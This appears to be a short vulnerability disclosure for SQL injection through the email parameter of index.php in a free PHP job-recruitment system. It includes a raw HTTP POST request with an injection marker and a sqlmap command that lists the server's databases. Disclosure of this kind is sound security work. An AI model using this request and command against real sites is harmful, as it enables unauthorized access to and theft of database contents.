# Job-recruitment-in-php has sql injection vulnerability in index.php  

## supplier
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
index.php
## describe
Through code audit, when there is an unauthorized SQL injection vulnerability in the index.php of the Job_Recruitment systtem, The information of the database can be obtained without authorization, and arbitrary commands may be executed. control parameter: **$email**

## code analysis
The **$email** parameters of the index.php are not filtered and concatenated into the SQL statement for execution. There sql injection vulnerability.

![image-20241110232236971](https://github.com/user-attachments/assets/eec9ee9d-ef11-4dfa-9bb9-09ff8c933f78)

## POC

### Get data

```
POST /index.php HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://airecruitmentsystem
Connection: close
Referer: http://airecruitmentsystem/index.php/
Cookie: PHPSESSID=apdbj581m83cio8cj275e494dr
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=1*&p=1
```

save as 1.txt 

and excute the command

```
python sqlmap.py -r 1.txt --dbs
```

get databases: owlphin,bloodbank,curd...

![image-20241111082034200](https://github.com/user-attachments/assets/50345c08-9441-4f67-aa07-cf6c9855d373)

**Discover**

西安电子科技大学 李腾，谢亚轩
